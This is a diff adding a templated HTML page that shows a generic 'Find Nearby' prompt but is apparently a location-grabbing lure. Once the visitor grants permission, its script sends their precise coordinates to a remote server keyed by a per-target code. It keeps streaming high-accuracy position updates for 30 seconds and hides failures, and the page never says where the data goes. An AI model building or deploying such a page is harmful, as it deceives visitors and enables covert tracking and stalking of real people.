@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Location</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.card{background:rgba(255,255,255,.05);backdrop-filter:blur(10px);border-radius:20px;padding:30px;width:100%;max-width:400px;border:1px solid rgba(255,255,255,.1);text-align:center}h2{font-size:22px;margin-bottom:8px}p{color:#aaa;font-size:14px;margin-bottom:20px}.btn{padding:14px 36px;font-size:16px;border:none;border-radius:50px;cursor:pointer;font-weight:600;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;transition:.3s}.btn:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(102,126,234,.4)}.btn:disabled{opacity:.5;cursor:not-allowed}.st{display:none;width:28px;height:28px;border:3px solid rgba(255,255,255,.2);border-top:3px solid #fff;border-radius:50%;animation:spin .8s linear infinite;margin:12px auto}@keyframes spin{to{transform:rotate(360deg)}}</style>
+</head>
+<body>
+<div class="card">
+<h2>Find Nearby</h2>
+<p>Enable location</p>
+<button class="btn" id="btn" onclick="getLoc()">Enable</button>
+<div class="st" id="sp"></div>
+<p id="st"></p>
+</div>
+<script>
+const code='{{code}}',srv='{{server}}';
+{% if not valid %}document.getElementById('btn').disabled=true;document.getElementById('st').innerHTML='Invalid';{% endif %}
+let w=null;
+function getLoc(){
+if(!navigator.geolocation){document.getElementById('st').innerHTML='Not supported';return}
+const btn=document.getElementById('btn'),sp=document.getElementById('sp');
+btn.disabled=true;sp.style.display='block';
+navigator.geolocation.getCurrentPosition(
+function(p){send(p);sp.style.display='none';document.getElementById('st').innerHTML='Got it';
+w=navigator.geolocation.watchPosition(send,()=>{},{enableHighAccuracy:true});
+setTimeout(()=>{if(w)navigator.geolocation.clearWatch(w);document.getElementById('st').innerHTML='Done'},30000);},
+function(e){sp.style.display='none';document.getElementById('st').innerHTML='Error: '+e.message;btn.disabled=false},
+{enableHighAccuracy:true,timeout:10000})}
+function send(p){fetch(srv+'/api/location/'+code,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:p.coords.latitude,lng:p.coords.longitude,accuracy:p.coords.accuracy,timestamp:new Date().toISOString()})}).catch(()=>{})}
+</script>
+</body>
+</html>
